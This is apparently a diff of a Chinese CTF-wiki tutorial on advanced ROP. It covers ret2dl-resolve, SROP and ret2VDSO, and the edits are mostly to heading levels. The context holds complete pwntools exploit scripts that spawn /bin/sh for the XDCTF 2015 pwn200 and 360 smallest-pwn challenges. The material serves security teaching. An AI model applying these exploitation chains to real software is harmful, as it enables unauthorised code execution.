@@ -3,9 +3,9 @@
 
 高级ROP其实和一般的ROP基本一样，其主要的区别在于它利用了一些更加底层的原理。
 
-# ret2_dl_runtime_resolve
+## ret2_dl_runtime_resolve
 
-## 原理
+### 原理
 
 要想弄懂这个ROP利用技巧，需要首先理解ELF文件的基本结构，以及动态链接的基本过程，请参考executable中elf对应的介绍。这里我只给出相应的利用方式。
 
@@ -30,11 +30,11 @@
 - 重定位表项
   - r_offset必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。
 
-## 攻击条件
+### 攻击条件
 
 说了这么多，这个利用技巧其实还是ROP，同样可以绕过NX和ASLR保护。但是，这个攻击更适于一些比较简单的栈溢出的情况，但同时又难以泄露获取更多信息的情况下。
 
-## 示例
+### 示例
 
 这里以XDCTF 2015的pwn200为例。主要参考
 
@@ -59,11 +59,11 @@
 
 2. 利用roputils中已经集成好的工具来实现攻击，从而获取shell。
 
-### 正常攻击
+#### 正常攻击
 
 显然我们程序有一个很明显的栈溢出漏洞的。这题我们不考虑我们有libc的情况。我们可以很容易的分析出偏移为112。
 
-```shell
+```asm
 gef➤  pattern create 200
 [+] Generating a pattern of 200 bytes
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
@@ -115,7 +115,7 @@ gef➤  pattern search 0x62616164
 [+] Found at offset 112 (little-endian search) likely
 ```
 
-#### stage 1
+##### stage 1
 
 这里我们的主要目的是控制程序执行write函数，虽然我们可以控制程序直接执行write函数。但是这里我们采用一个更加复杂的办法，即使用栈迁移的技巧，将栈迁移到bss段来控制write函数。即主要分为两步
 
@@ -135,19 +135,19 @@ bss_addr = elf.bss()
 
 r.recvuntil('Welcome to XDCTF2015~!\n')
 
-# stack privot to bss segment
-# new stack size is 0x800
+## stack privot to bss segment
+## new stack size is 0x800
 stack_size = 0x800
 base_stage = bss_addr + stack_size
-## padding
+### padding
 rop.raw('a' * offset)
-## read 100 byte to base_stage
+### read 100 byte to base_stage
 rop.read(0, base_stage, 100)
-## stack privot, set esp = base_stage
+### stack privot, set esp = base_stage
 rop.migrate(base_stage)
 r.sendline(rop.chain())
 
-# write cmd="/bin/sh"
+## write cmd="/bin/sh"
 rop = ROP('./main')
 sh = "/bin/sh"
 rop.write(1, base_stage + 80, len(sh))
@@ -176,7 +176,7 @@ r.interactive()
 
 ```
 
-#### stage 2
+##### stage 2
 
 在这一阶段，我们将会利用dlresolve相关的知识来控制程序执行write函数。这里我们主要是利用plt[0]中的相关指令，即push linkmap以及跳转到dl_resolve函数中解析的指令。此外，我们还得单独提供一个write重定位项在plt表中的偏移。
 
@@ -191,19 +191,19 @@ bss_addr = elf.bss()
 
 r.recvuntil('Welcome to XDCTF2015~!\n')
 
-# stack privot to bss segment
-# new stack size is 0x800
+## stack privot to bss segment
+## new stack size is 0x800
 stack_size = 0x800
 base_stage = bss_addr + stack_size
-## padding
+### padding
 rop.raw('a' * offset)
-## read 100 byte to base_stage
+### read 100 byte to base_stage
 rop.read(0, base_stage, 100)
-## stack privot, set esp = base_stage
+### stack privot, set esp = base_stage
 rop.migrate(base_stage)
 r.sendline(rop.chain())
 
-# write cmd="/bin/sh"
+## write cmd="/bin/sh"
 rop = ROP('./main')
 sh = "/bin/sh"
 
@@ -212,7 +212,7 @@ write_index = (elf.plt['write'] - plt0) / 16 - 1
 write_index *= 8
 rop.raw(plt0)
 rop.raw(write_index)
-# fake ret addr of write
+## fake ret addr of write
 rop.raw('bbbb')
 rop.raw(1)
 rop.raw(base_stage + 80)
@@ -242,7 +242,7 @@ r.interactive()
 /bin/sh[*] Got EOF while reading in interactive
 ```
 
-#### stage 3
+##### stage 3
 
 这一次，我们同样控制dl_resolve函数中的index_offset参数，不过这次控制其指向我们伪造的write重定位项。
 
@@ -279,32 +279,32 @@ bss_addr = elf.bss()
 
 r.recvuntil('Welcome to XDCTF2015~!\n')
 
-# stack privot to bss segment
-# new stack size is 0x800
+## stack privot to bss segment
+## new stack size is 0x800
 stack_size = 0x800
 base_stage = bss_addr + stack_size
-## padding
+### padding
 rop.raw('a' * offset)
-## read 100 byte to base_stage
+### read 100 byte to base_stage
 rop.read(0, base_stage, 100)
-## stack privot, set esp = base_stage
+### stack privot, set esp = base_stage
 rop.migrate(base_stage)
 r.sendline(rop.chain())
 
-# write sh="/bin/sh"
+## write sh="/bin/sh"
 rop = ROP('./main')
 sh = "/bin/sh"
 
 plt0 = elf.get_section_by_name('.plt').header.sh_addr
 rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
-# making base_stage+24 ---> fake reloc
+## making base_stage+24 ---> fake reloc
 index_offset = base_stage + 24 - rel_plt
 write_got = elf.got['write']
 r_info = 0x607
 
 rop.raw(plt0)
 rop.raw(index_offset)
-# fake ret addr of write
+## fake ret addr of write
 rop.raw('bbbb')
 rop.raw(1)
 rop.raw(base_stage + 80)
@@ -335,7 +335,7 @@ r.interactive()
 /bin/sh[*] Got EOF while reading in interactive
 ```
 
-#### stage 4
+##### stage 4
 
 stage3中，我们控制了重定位表项，但是重定位表项的内容与write原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据write的重定位表项的r_info=0x607可以知道，write对应的符号在符号表的下标为0x607>>8=0x6。因此，我们知道write对应的符号地址为0x8048238。
 
@@ -370,19 +370,19 @@ bss_addr = elf.bss()
 
 r.recvuntil('Welcome to XDCTF2015~!\n')
 
-# stack privot to bss segment
-# new stack size is 0x800
+## stack privot to bss segment
+## new stack size is 0x800
 stack_size = 0x800
 base_stage = bss_addr + stack_size
-## padding
+### padding
 rop.raw('a' * offset)
-## read 100 byte to base_stage
+### read 100 byte to base_stage
 rop.read(0, base_stage, 100)
-## stack privot, set esp = base_stage
+### stack privot, set esp = base_stage
 rop.migrate(base_stage)
 r.sendline(rop.chain())
 
-# write sh="/bin/sh"
+## write sh="/bin/sh"
 rop = ROP('./main')
 sh = "/bin/sh"
 
@@ -391,7 +391,7 @@ rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
 dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
 dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
 
-## making fake write symbol
+### making fake write symbol
 fake_sym_addr = base_stage + 32
 align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                 )  # since the size of item(Elf32_Symbol) of dynsym is 0x10
@@ -400,9 +400,9 @@ index_dynsym = (
     fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
 fake_write_sym = flat([0x4c, 0, 0, 0x12])
 
-## making fake write relocation
+### making fake write relocation
 
-# making base_stage+24 ---> fake reloc
+## making base_stage+24 ---> fake reloc
 index_offset = base_stage + 24 - rel_plt
 write_got = elf.got['write']
 r_info = (index_dynsym << 8) | 0x7
@@ -410,7 +410,7 @@ fake_write_reloc = flat([write_got, r_info])
 
 rop.raw(plt0)
 rop.raw(index_offset)
-# fake ret addr of write
+## fake ret addr of write
 rop.raw('bbbb')
 rop.raw(1)
 rop.raw(base_stage + 80)
@@ -443,7 +443,7 @@ r.interactive()
 
 ```
 
-#### stage 5
+##### stage 5
 
 这一阶段，我们将在阶段4的基础上，我们进一步使得write符号的st_name指向我们自己构造的字符串。
 
@@ -458,19 +458,19 @@ bss_addr = elf.bss()
 
 r.recvuntil('Welcome to XDCTF2015~!\n')
 
-# stack privot to bss segment
-# new stack size is 0x800
+## stack privot to bss segment
+## new stack size is 0x800
 stack_size = 0x800
 base_stage = bss_addr + stack_size
-## padding
+### padding
 rop.raw('a' * offset)
-## read 100 byte to base_stage
+### read 100 byte to base_stage
 rop.read(0, base_stage, 100)
-## stack privot, set esp = base_stage
+### stack privot, set esp = base_stage
 rop.migrate(base_stage)
 r.sendline(rop.chain())
 
-# write sh="/bin/sh"
+## write sh="/bin/sh"
 rop = ROP('./main')
 sh = "/bin/sh"
 
@@ -479,20 +479,20 @@ rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
 dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
 dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
 
-## making fake write symbol
+### making fake write symbol
 fake_sym_addr = base_stage + 32
 align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                 )  # since the size of item(Elf32_Symbol) of dynsym is 0x10
 fake_sym_addr = fake_sym_addr + align
 index_dynsym = (
     fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
-# plus 10 since the size of Elf32_Sym is 16.
+## plus 10 since the size of Elf32_Sym is 16.
 st_name = fake_sym_addr + 0x10 - dynstr
 fake_write_sym = flat([st_name, 0, 0, 0x12])
 
-## making fake write relocation
+### making fake write relocation
 
-# making base_stage+24 ---> fake reloc
+## making base_stage+24 ---> fake reloc
 index_offset = base_stage + 24 - rel_plt
 write_got = elf.got['write']
 r_info = (index_dynsym << 8) | 0x7
@@ -500,7 +500,7 @@ fake_write_reloc = flat([write_got, r_info])
 
 rop.raw(plt0)
 rop.raw(index_offset)
-# fake ret addr of write
+## fake ret addr of write
 rop.raw('bbbb')
 rop.raw(1)
 rop.raw(base_stage + 80)
@@ -533,7 +533,7 @@ r.interactive()
 /bin/sh[*] Got EOF while reading in interactive
 ```
 
-#### stage 6
+##### stage 6
 
 这一阶段，我们只需要将原先的write字符串修改为system字符串，同时修改write的参数为system的参数即可获取shell。这是因为，dl_resolve最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。具体代码如下
 
@@ -548,19 +548,19 @@ bss_addr = elf.bss()
 
 r.recvuntil('Welcome to XDCTF2015~!\n')
 
-# stack privot to bss segment
-# new stack size is 0x800
+## stack privot to bss segment
+## new stack size is 0x800
 stack_size = 0x800
 base_stage = bss_addr + stack_size
-## padding
+### padding
 rop.raw('a' * offset)
-## read 100 byte to base_stage
+### read 100 byte to base_stage
 rop.read(0, base_stage, 100)
-## stack privot, set esp = base_stage
+### stack privot, set esp = base_stage
 rop.migrate(base_stage)
 r.sendline(rop.chain())
 
-# write sh="/bin/sh"
+## write sh="/bin/sh"
 rop = ROP('./main')
 sh = "/bin/sh"
 
@@ -569,20 +569,20 @@ rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
 dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
 dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
 
-## making fake write symbol
+### making fake write symbol
 fake_sym_addr = base_stage + 32
 align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                 )  # since the size of item(Elf32_Symbol) of dynsym is 0x10
 fake_sym_addr = fake_sym_addr + align
 index_dynsym = (
     fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
-# plus 10 since the size of Elf32_Sym is 16.
+## plus 10 since the size of Elf32_Sym is 16.
 st_name = fake_sym_addr + 0x10 - dynstr
 fake_write_sym = flat([st_name, 0, 0, 0x12])
 
-## making fake write relocation
+### making fake write relocation
 
-# making base_stage+24 ---> fake reloc
+## making base_stage+24 ---> fake reloc
 index_offset = base_stage + 24 - rel_plt
 write_got = elf.got['write']
 r_info = (index_dynsym << 8) | 0x7
@@ -590,7 +590,7 @@ fake_write_reloc = flat([write_got, r_info])
 
 rop.raw(plt0)
 rop.raw(index_offset)
-# fake ret addr of write
+## fake ret addr of write
 rop.raw('bbbb')
 rop.raw(base_stage + 82)
 rop.raw('bbbb')
@@ -656,7 +656,7 @@ core  main.c     stage2.py  stage4.py  stage6.py
 main  stage1.py  stage3.py  stage5.py
 ```
 
-### 工具攻击
+#### 工具攻击
 
 根据上面的介绍，我们应该很容易可以理解这个攻击了。下面我们直接使用roputil来进行攻击。代码如下
 
@@ -675,13 +675,13 @@ bss_base = rop.section('.bss')
 buf = rop.fill(offset)
 
 buf += rop.call('read', 0, bss_base, 100)
-# used to call dl_Resolve()
+## used to call dl_Resolve()
 buf += rop.dl_resolve_call(bss_base + 20, bss_base)
 r.send(buf)
 
 buf = rop.string('/bin/sh')
 buf += rop.fill(20, buf)
-# used to make faking data, such relocation, Symbol, Str
+## used to make faking data, such relocation, Symbol, Str
 buf += rop.dl_resolve_data(bss_base + 20, 'system')
 buf += rop.fill(100, buf)
 r.send(buf)
@@ -730,13 +730,13 @@ __init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py
 
 ```
 
-## 题目
+### 题目
 
 
 
-# SROP
+## SROP
 
-## 基本介绍
+### 基本介绍
 
 SROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit Amsterdam的Erik Bosman提出，其相关研究**`Framing Signals — A Return to Portable Shellcode`**发表在安全顶级会议[Oakland 2014](http://www.ieee-security.org/TC/SP2014)上，被评选为当年的[Best Student Papers](http://www.ieee-security.org/TC/SP2014/awards.html)。其中相关的paper以及slides的链接如下：
 
@@ -746,7 +746,7 @@ SROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit Amsterdam的
 
 其中，`sigreturn`是一个系统调用，在类unix系统发生signal的时候会被间接地调用。
 
-## signal机制
+### signal机制
 
  signal机制是类unix系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用kill来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：
 
@@ -851,7 +851,7 @@ SROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit Amsterdam的
 
 1. signal handler返回后，内核为执行sigreturn系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新pop回对应的寄存器，最后恢复进程的执行。其中，32位的sigreturn的调用号为77，64位的系统调用号为15。
 
-## 攻击原理
+### 攻击原理
 
 仔细回顾一下内核在signal信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在Signal Frame中。但是需要注意的是：
 
@@ -860,7 +860,7 @@ SROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit Amsterdam的
 
 说到这里，其实，SROP的基本利用原理也就出现了。下面举两个简单的例子。
 
-### 获取shell
+#### 获取shell
 
 首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个Signal Frame，如下图所示，这里以64位为例子，给出Signal Frame更加详细的信息
 
@@ -868,7 +868,7 @@ SROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit Amsterdam的
 
 当系统执行完sigreturn系统调用之后，会执行一系列的pop指令以便于恢复相应寄存器的值，当执行到rip时，就会将程序执行流指向syscall地址，根据相应寄存器的值，此时，便会得到一个shell。
 
-### system call chains
+#### system call chains
 
 需要指出的是，上面的例子中，我们只是单独的获得一个shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可
 
@@ -879,7 +879,7 @@ SROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit Amsterdam的
 
 ![signal2-stack](/pwn/stackoverflow/figure/srop-example-2.png)
 
-### 后续
+#### 后续
 
 需要注意的是，我们在构造ROP攻击的时候，需要满足下面的条件
 
@@ -903,11 +903,11 @@ SROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit Amsterdam的
 
 值得一说的是，对于sigreturn系统调用来说，在64位系统中，sigreturn系统调用对应的系统调用号为15，只需要RAX=15，并且执行syscall即可实现调用syscall调用。而RAX寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说read函数的返回值为读取的字节数。
 
-## 利用工具
+### 利用工具
 
 **值得一提的是，在目前的pwntools中已经集成了对于srop的攻击。**
 
-## 示例
+### 示例
 
 这里以360春秋杯中的smallest-pwn为例进行简单介绍。基本步骤如下
 
@@ -972,19 +972,19 @@ context.arch = 'amd64'
 context.log_level = 'debug'
 syscall_ret = 0x00000000004000BE
 start_addr = 0x00000000004000B0
-# set start addr three times
+## set start addr three times
 payload = p64(start_addr) * 3
 sh.send(payload)
 
-# modify the return addr to start_addr+3
-# so that skip the xor rax,rax; then the rax=1
-# get stack addr
+## modify the return addr to start_addr+3
+## so that skip the xor rax,rax; then the rax=1
+## get stack addr
 sh.send('\xb3')
 stack_addr = u64(sh.recv()[8:16])
 log.success('leak stack addr :' + hex(stack_addr))
 
-# make the rsp point to stack_addr
-# the frame is read(0,stack_addr,0x400)
+## make the rsp point to stack_addr
+## the frame is read(0,stack_addr,0x400)
 sigframe = SigreturnFrame()
 sigframe.rax = constants.SYS_read
 sigframe.rdi = 0
@@ -995,11 +995,11 @@ sigframe.rip = syscall_ret
 payload = p64(start_addr) + 'a' * 8 + str(sigframe)
 sh.send(payload)
 
-# set rax=15 and call sigreturn
+## set rax=15 and call sigreturn
 sigreturn = p64(syscall_ret) + 'b' * 7
 sh.send(sigreturn)
 
-# call execv("/bin/sh",0,0)
+## call execv("/bin/sh",0,0)
 sigframe = SigreturnFrame()
 sigframe.rax = constants.SYS_execve
 sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr
@@ -1025,7 +1025,7 @@ sh.interactive()
 - 再次读取构造sigreturn调用，进而将向栈地址所在位置读入数据，构造execve('/bin/sh',0,0)
 - 再次读取构造sigreturn调用，从而获取shell。
 
-## 题目
+### 题目
 
 - [Defcon 2015 Qualifier: fuckup](https://brant-ruan.github.io/resources/Binary/learnPwn/fuckup_56f604b0ea918206dcb332339a819344)
 
@@ -1035,9 +1035,9 @@ sh.interactive()
 - [SROP by Angle Baby](https://www.slideshare.net/AngelBoy1/sigreturn-ori)
 - [系统调用](http://www.cs.utexas.edu/~bismith/test/syscalls/syscalls64_orig.html)
 
-# ret2VDSO
+## ret2VDSO
 
-## VDSO介绍
+### VDSO介绍
 
 什么是VDSO(Virtual Dynamically-linked Shared Object)呢？听其名字，大概是虚拟动态链接共享对象，所以说它应该是虚拟的，与虚拟内存一直，在计算机中本身并不存在。具体来说，它是将内核态的调用映射到用户地址空间的库。那么它为什么会存在呢？这是因为有些系统调用经常被用户使用，这就会出现大量的用户态与内核态切换的开销。通过vdso，我们可以大量减少这样的开销，同时也可以使得我们的路径更好。这里路径更好指的是，我们不需要使用传统的int 0x80来进行系统调用，不同的处理器实现了不同的快速系统调用指令
 
@@ -1061,18 +1061,18 @@ sh.interactive()
 
 其中sysenter的参数传递方式与int 0x80一致，但是我们可能需要自己布置好 function prolog（32位为例）
 
-```assembly
+```asm
 push ebp
 mov ebp,esp
 ```
 
 此外，如果我们没有提供functtion prolog的话，我们还需要一个可以进行栈迁移的gadgets，以便于可以改变栈的位置。
 
-## 原理
+### 原理
 
 待补充。	
 
-## 题目
+### 题目
 
 - **Defcon 2015 Qualifier fuckup**
 
@@ -1081,11 +1081,11 @@ mov ebp,esp
 - http://man7.org/linux/man-pages/man7/vdso.7.html
 - http://adam8157.info/blog/2011/10/linux-vdso/
 
-# JOP
+## JOP
 
 Jump-oriented programming
 
-# COP
+## COP
 
 Call-oriented programming
 
